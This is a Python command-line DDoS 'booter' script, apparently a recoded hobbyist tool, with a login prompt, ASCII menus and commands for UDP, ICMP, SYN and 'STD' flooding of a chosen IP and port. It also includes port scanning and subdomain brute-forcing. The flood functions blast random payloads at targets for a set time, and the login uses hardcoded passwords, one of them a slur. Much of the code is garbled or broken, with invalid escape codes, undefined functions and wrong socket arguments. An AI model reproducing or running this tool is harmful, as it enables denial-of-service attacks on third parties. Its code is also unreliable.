#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os

sys.stdout.write("\x1b]2;C O R T E X |CORT| D O W N E D\x07")
def modifications():
	print ("Contact Misfortune or Reaper the script is currently under maitnance")
	on_enter = input("Please press enter to leave")
	exit()
#column:65
method = """\1000[4000m
╔══════════════════════════════════════════════════════╗
║                     \1000[4000mDDoS METHODS\1000[4000m                     ║               
║══════════════════════════════════════════════════════║
║ \1000[4000mUDP  <IP> <PORT> <TIMEOUT> <SIZE>1000[4000|\1000[4000m UDP  ATTACK\1000[4000m   ║
║ \1000[4000mICMP <IP> <PORT> <TIMEOUT> <SIZE>1000[4000|\1000[4000m ICMP ATTACK\1000[4000m   ║
║ \1000[4000mSYN  <IP> <PORT> <TIMEOUT> <SIZE>1000[4000|\1000[4000m SYN  ATTACK\1000[4000m   ║
║ \1000[4000mSTD  <IP> <PORT> <TIMEOUT> <SIZE> \1000[4000m |\1000[4000m STD  ATTACK\1000[4000m   ║
║ \1000[4000mHTTP <IP> <PORT> <TIMEOUT> <SIZE>1000[4000|\1000[4000m HTTP ATTACK\1000[4000m   ║
╚══════════════════════════════════════════════════════╝\1000[4000m
"""

info = """
[\033[91mpeixoto\1000[4000m] \1000[4000mCortex, Made By Envy, Re Coded from peixotoMDZZ,
i liked this scripts, so i simply re coded it,
i will be adding new methods all the time,
stay tuned. 
peixotoMDZZs Biggest Attack
31.9 gbps
Cortexs, Biggest Attack,
Not Recorded, (Most Likely The Same As peixotoMDZZ.)
"""

version = "3.2"

ajuda = """\1000[4000m{}
╔══════════════════════════════════════════════════════╗
║                    \1000[4000mBASIC COMMANDS\1000[4000m                    ║
║══════════════════════════════════════════════════════║
║ \1000[4000mClear                       1000[4000|\1000[4000m CLEAR SCREEN\1000[4000m         ║
║ \1000[4000mExit                        1000[4000|\1000[4000m EXIT peixotoMDZZ\1000[4000m         ║
║ \1000[4000mMethods                     1000[4000|\1000[4000m peixotoS METHODS\1000[4000m         ║
║ \1000[4000mTools                       1000[4000|\1000[4000m BASIC TOOLS\1000[4000m          ║
║ \1000[4000mUpdates                     1000[4000|\1000[4000m DISPLAY UPDATE NOTES\1000[4000m ║
║ \1000[4000mInfo                        1000[4000|\1000[4000m DISPLAY peixotoMDZZS INFO\\1000[4000m 
╚══════════════════════════════════════════════════════╝\1000[4000m
"""

tools = """\033[91m
╔══════════════════════════════════════════════════════╗
║                        \1000[4000mTOOLS\1000[4000m                         ║
║══════════════════════════════════════════════════════║
║ \1000[4000mStopattacks                 1000[4000|\1000[4000m STOP ALL ATTACKS\1000[4000m     ║
║ \1000[4000mAttacks                     1000[4000|\1000[4000m RUNNING ATTACKS\1000[4000m      ║
║ \1000[4000mPing <IP>                 1000[4000|\1000[4000m PING A IP\1000[4000m          ║
║ \1000[4000mResolve <IP>              1000[4000|\1000[4000m GRAB A DOMIANS IP\1000[4000m    ║
║ \1000[4000mPortscan <IP> <RANGE>     1000[4000|\1000[4000m PORTSCAN A IP  \1000[4000m    ║
║ \1000[4000mDnsresolve <IP>           1000[4000|\1000[4000m GRAB ALL SUB-DOMAINS\1000[4000m ║
║ \1000[4000mStats                       1000[4000|\1000[4000m DISPLAY peixotoMDZZ STATS\\1000[4000m 
╚══════════════════════════════════════════════════════╝\1000[4000m
"""

updatenotes = """\1000[4000m
╔══════════════════════════════════════════════════════╗
║                     \1000[4000mUPDATE NOTES\1000[4000m                     ║
║══════════════════════════════════════════════════════║
║ \1000[4000m- Better ascii menu\1000[4000m                                  ║
║ \1000[4000m- Updated command capeixotog no longer only capital\1000[4000m      ║
║ \1000[4000m- Updated attack methods\1000[4000m                             ║
║ \1000[4000m- Timeout bug fixed\1000[4000m                                  ║
║ \1000[4000m- Background attacks\1000[4000m                                 ║
║ \1000[4000m- Running task displayer\1000[4000m                             ║
║ \1000[4000m- All tools fixed and working\1000[4000m                        ║
║ \1000[4000m- Fixed HTTP & SYN Methods All Methods Working\1000[4000m       ║ 
║ \1000[4000m- Deleted HTTP & Added STD, STD Is Working & Tested\1000[4000m  ║
╚══════════════════════════════════════════════════════╝\1000[4000m

"""
statz = """

║              \1000[4000mSTATS\1000[4000m                     ║

\1000[4000m- Attacks: \033[91m{}                                        
\1000[4000m- Found Domains: \033[91m{}                                  
\1000[4000m- PINGS: \033[91m{}                                          
\1000[4000m- PORTSCANS: \033[91m{}                                      
\1000[4000m- GRABBED IPS: \033[91m{}                                 
╚══════════════════════════════════════════════════════╝\1000[4000m"""
banner = """\033[1;00m
 P Σ I X Ө Ƭ Ө M D Z Z
                       \1000[4000mpeixotoい\1000[4000m
"""

altbanner = """
			     Angels go to heaven
			   Demons meet the gates of hell
		      peixotoMDZZ people are punished put in hell
		     peixotoners Meet The Cortex And Fall Into The Vortex
		      		       	C O R T E X  
"""

cookie = open(".peixotoMDZZ_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
tattacks = 99999999
uaid = 0
said = 0
iaid = 0
haid = 0
aid = 0
attack = true
http = false
udp = true
syn = true
icmp = false
std = true


def synsender(IP, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (IP, int(port)))
	said -= 1
	aid -= 1

def udpsender(IP, port, timer, punch):
	global uaid
	global udp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	
	uaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and udp and attack:
		sock.sendto(punch, (IP, int(port)))
	uaid -= 1
	aid -= 1

def icmpsender(IP, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (IP, int(port)))
	iaid -= 1
	aid -= 1

def stdsender(IP, port, timer, punch):
	global iaid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (IP, int(port)))
	iaid -= 1
	aid -= 1

def httpsender(IP, port, timer, punch):
	global haid
	global icmp
	global aid
	global tattacks

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.IPPROTO_IGMP)

	iaid += 1
	aid += 1
	tattacks += 1
	while time.time() < timeout and icmp and attack:
		sock.sendto(punch, (IP, int(port)))
	haid -= 1
	aid -= 1


def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global uaid
	global said
	global iaid
	global haid
	global aid
	global attack
	global dp
	global syn
	global icmp
	global std

	while True:
		sys.stdout.write("\x1b]2;PEIXOTO\x07")
		peixoto = input("\033[1;00m[\033[91mpeixotoMDZZ\033[1;00m]-\033[91m家\1000[4000m ").lower()
		peixotoput = peixoto.split(" ")[2]
		if peixotoput == "clear":
			os.system ("clear")
			print (altbanner)
			main()
		elif peixotoput == "ajuda":
			print (ajuda)
			main()
		elif peixotoput == "":
			main()
		elif peixotoput == "exit":
			exit()
		elif peixotoput == "version":
			print ("peixotoful version: "+version+" ")
		elif peixotoput == "stats":
			print ("\1000[4000m- Attacks: \1000[4000m{}                                        ".format (tattacks))
			print ("\1000[4000m- Found Domains: \1000[4000m{}                               ".format(fsubs))
			print ("\1000[4000m- PINGS: \1000[4000m{}                                          ".format(tpings))
			print ("\1000[4000m- PORTSCANS: \1000[4000m{}                                      ".format(pscans))
			print ("\1000[4000m- GRABBED IPS: \1000[4000m{}}\n                                    ".format(liips))
			main()
		elif peixotoput == "methods":
			print (method)
			main()
		elif peixotoput == "tools":
			print (tools)
			main()
		elif peixotoput == "portscan":
			port_range = int(peixoto.split(" ")[2])
			pscans += 1
			def scan(port, ip):
				try:
					sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					sock.connect((ip, port))
					print ("[\1000-4000mpeixoto\1000[4000m] {}\033[91m:\1000[4000m{} [\033[91mOPEN\1000[4000m]".format (ip, port))
					sock.close()
				except socket.error:
					return
				except KeyboardInterrupt:
					print ("\n")
			for port in range(1, port_range+1):
				ip = socket.getIPbyname(peixoto.split(" ")[1])
				threading.Thread(target=scan, args=(port, ip)).start()
		elif peixotoput == "updates":
			print (updatenotes)
			main()
		elif peixotoput == "info":
			print (info)
			main()
		elif peixotoput == "attacks":
			print ("\n[\1000-4000mpeixoto\1000[4000m] UPD Running processes: {}".format (uaid))
			print ("[\1000-4000mpeixoto\1000[4000m] ICMP Running processes: {}".format (iaid))
			print ("[\1000-4000mpeixoto\1000[4000m] SYN Running processes: {}".format (said))
			print ("[\1000-4000mpeixoto\1000[4000m] STD Running Processes: {}".format (said))
			print ("[\1000-4000mpeixoto\1000[4000m] Total attacks running: {}\n".format (aid))
			main()
		elif peixotoput == "dnsresolve":
			sfound = 0
			sys.stdout.write("\x1b]2;PEIXOTO|{}| F O U N D\x07".format (sfound))
			try:
				IP = peixoto.split(" ")[1]
				with open(r"/usr/share/peixotoMDZZ/subnames.txt", "r") as sub:
					domains = sub.readlines()	
				for link in domains:
					try:
						url = link.strip() + "." + IP
						subips = socket.getIPbyname(url)
						print ("[\1000-4000mpeixoto\1000[4000m] Domain: https://{} \033[91m>\1000[4000m Converted: {} [\033[91mEXISTANT\1000[4000m]".format(url, subips))
						sfound += 1
						fsubs += 1
						sys.stdout.write("\x1b]2;PEIXOTO |{}| F O U N D\x07".format (sfound))
					except socket.error:
						pass
						#print ("[\1000-4000mpeixoto\1000[4000m] Domain: {} [\033[91mNON-EXISTANT\1000[4000m]".format(url))
				print ("[\1000-4000mpeixoto\1000[4000m] Task complete | found: {}".format(sfound))
				main()
			except IndexError:
				print ('ADD THE IP!')
		elif peixotoput == "resolve":
			liips += 1
			IP = peixoto.split(" ")[1]
			IP_ip = socket.getIPbyname(IP)
			print ("[\1000-4000mpeixoto\1000[4000m] IP: {} \1000[4000m[\033[91mConverted\1000[4000m] {}".format (IP, IP_ip))
			main()
		elif peixotoput == "ping":
			tpings += 1
			try:
				peixotoput, IP, port = peixoto.split(" ")
				print ("[\1000-4000mpeixoto\1000[4000m] Starting ping on IP: {}".format (IP))
				try:
					ip = socket.getIPbyname(IP)
				except socket.gaierror:
					print ("[\1000-4000mpeixoto\1000[4000m] IP un-resolvable")
					main()
				while True:
					try:
						sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
						sock.settimeout(2)
						start = time.time() * 1000
						sock.connect ((IP, int(port)))
						stop = int(time.time() * 1000 - start)
						sys.stdout.write("\x1b]2;PEIXOTO |{}ms| D E M O N S\x07".format (stop))
						print ("peixotoMDZZ: {}:{} | Time: {}ms [\033[91mUP\1000[4000m]".format(ip, port, stop))
						sock.close()
						time.sleep(1)
					except socket.error:
						sys.stdout.write("\x1b]2;PEIXOTO |TIME OUT| D E M O N S\x07")
						print ("peixotoMDZZ: {}:{} [\033[91mDOWN\1000[4000m]".format(ip, port))
						time.sleep(1)
					except KeyboardInterrupt:
						print("")
						main()
			except ValueError:
				print ("[\1000-4000mpeixoto\1000[4000m] The command {} requires an argument".format (peixotoput))
				main()
		elif peixotoput == "udp":
			if username == "guests":
				print ("[\1000-4000mpeixoto\1000[4000m] You are not allowed to use this method")
				main()
			else:
				try:
					peixotoput, IP, port, timer, pack = peixoto.split(" ")
					socket.getIPbyname(IP)
					print ("Attack sent to: {}".format (IP))
					punch = random._urandom(int(pack))
					threading.Thread(target=udpsender, args=(IP, port, timer, punch)).start()
				except ValueError:
					print ("[\1000-4000mpeixoto\1000[4000m] The command {} requires an argument".format (peixotoput))
					main()
				except socket.gaierror:
					print ("[\1000-4000mpeixoto\1000[4000m] IP: {} invalid".format (IP))
					main()
		elif peixotoput == "std":
			try:
				peixotoput, IP, port, timer, pack = peixoto.split(" ")
				socket.getIPbyname(IP)
				print ("Attack sent to: {}".format (IP))
				punch = random._urandom(int(pack))
				threading.Thread(target=stdsender, args=(IP, port, timer, punch)).start()
			except ValueError:
				print ("[\1000-4000mpeixoto\1000[4000m] The command {} requires an argument".format (peixotoput))
				main()
			except socket.gaierror:
				print ("[\1000-4000mpeixoto\1000[4000m] IP: {} invalid".format (IP))
				main()
		elif peixotoput == "icmp":
			if username == "guests":
				print ("[\1000-4000mpeixoto\1000[4000m] You are not allowed to use this method")
				main()
			else:
				try:
					peixotoput, IP, port, timer, pack = peixoto.split(" ")
					socket.getIPbyname(IP)
					print ("Attack sent to: {}".format (IP))
					punch = random._urandom(int(pack))
					threading.Thread(target=icmpsender, args=(IP, port, timer, punch)).start()
				except ValueError:
					print ("[\1000-4000mpeixoto\1000[4000m] The command {} requires an argument".format (peixotoput))
					main()
				except socket.gaierror:
					print ("[\1000-4000mpeixoto\1000[4000m] IP: {} invalid".format (IP))
					main()
		elif peixotoput == "syn":
			try:
				peixotoput, IP, port, timer, pack = peixoto.split(" ")
				socket.getIPbyname(IP)
				print ("Attack sent to: {}".format (IP))
				punch = random._urandom(int(pack))
				threading.Thread(target=icmpsender, args=(IP, port, timer, punch)).start()
			except ValueError:
				print ("[\1000-4000mpeixoto\1000[4000m] The command {} requires an argument".format (peixotoput))
				main()
			except socket.gaierror:
				print ("[\1000-4000mpeixoto\1000[4000m] IP: {} invalid".format (IP))
				main()
		elif peixotoput == "stopattacks":
			attack = False
			while not attack:
				if aid == 0:
					attack = True
		elif peixotoput == "stop":
			what = peixoto.split(" ")[1]
			if what == "udp":
				print ("Stoping all udp attacks")
				udp = False
				while not udp:
					if aid == 2:
						print ("[\1000-4000mpeixoto\1000[4000m] No udp Processes running.")
						udp = True
						main()
			if what == "icmp":
				print ("Stopping all icmp attacks")
				icmp = False
				while not icmp:
					print ("[\1000-4000mpeixoto\1000[4000m] No ICMP processes running")
					udp = True
					main()
		else:
			print ("[\1000-4000mpeixoto\1000[4000m] {} Not a command".format(peixotoput))
			main()



try:
	users = ["root", "guests", "me"]
	clear = "clear"
	os.system (clear)
	username = getpass.getpass ("[+] Username: ")
	if username in users:
		user = username
	else:
		print ("[+] Incorrect, exiting")
		exit()
except KeyboardInterrupt:
	print ("\nCTRL-C Pressed")
	exit()
try:
	passwords = ["root", "gayman", "me"]
	password = getpass.getpass ("[+] Password: ")
	if user == "root":
		if password == passwords[0]:
			print ("[+] Login correct")
			cookie.write("DIE")
			time.sleep(2)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\1000-4000mpeixoto\1000[4000m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
	if user == "guests":
		if password == passwords[1]:
			print ("[+] Login correct")
			print ("[+] Certain methods will not be available to you")
			time.sleep(4)
			os.system (clear)
			try:
				os.system ("clear")
				print (banner)
				main()
			except KeyboardInterrupt:
				print ("\n[\1000-4000mpeixoto\1000[4000m] CTRL has been pressed")
				main()
		else:
			print ("[+] Incorrect, exiting")
			exit()
except KeyboardInterrupt:
	exit()